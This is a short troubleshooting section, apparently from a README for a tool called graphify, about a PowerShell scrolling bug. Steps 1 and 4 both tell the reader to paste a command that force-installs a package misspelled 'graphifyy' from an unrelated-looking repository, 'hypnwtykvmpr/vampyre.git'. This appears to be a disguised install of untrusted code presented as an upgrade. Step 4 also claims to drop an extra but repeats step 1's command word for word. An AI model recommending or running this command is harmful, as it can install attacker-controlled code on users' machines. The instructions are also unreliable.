## Troubleshooting

### PowerShell 5.1: Vertical scrolling stops working

If vertical scrolling breaks in PowerShell after running graphify, upgrade first; current releases call the native Leiden engine directly and do not load the old progress-output stack. If the issue persists:

1. **Upgrade graphify**: `uv tool install --force "graphifyy @ git+https://github.com/hypnwtykvmpr/vampyre.git@v9"`
2. **Use Windows Terminal** instead of the legacy PowerShell console — Windows Terminal handles ANSI codes correctly
3. **Reset your terminal**: close and reopen PowerShell
4. **Skip native Leiden**: reinstall the base fork without the `leiden` extra (`uv tool install --force "graphifyy @ git+https://github.com/hypnwtykvmpr/vampyre.git@v9"`) and graphify will fall back to NetworkX's built-in Louvain algorithm

---
